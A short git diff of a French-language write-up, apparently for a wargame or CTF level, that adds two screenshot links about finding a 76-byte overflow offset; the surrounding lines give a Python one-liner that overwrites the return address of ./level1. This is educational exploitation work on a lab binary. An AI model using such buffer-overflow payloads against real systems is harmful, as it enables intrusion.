@@ -22,6 +22,10 @@ eip = 0x8048481 in main; saved eip 0xb7e454d3
 - Utilisation d'un pattern cyclique pour trouver l'offset précis
 - L'offset entre le début du buffer et EBP+4 est de 76 bytes
 
+![alt Ressources/overflow_pattern_1.png](Ressources/overflow_pattern_1.png)
+
+![alt Ressources/overflow_pattern_2.png](Ressources/overflow_pattern_2.png)
+
 **Construction de l'Exploit**
 ```bash
 (python -c 'print "A"*76 + "\x44\x84\x04\x08"'; cat) | ./level1
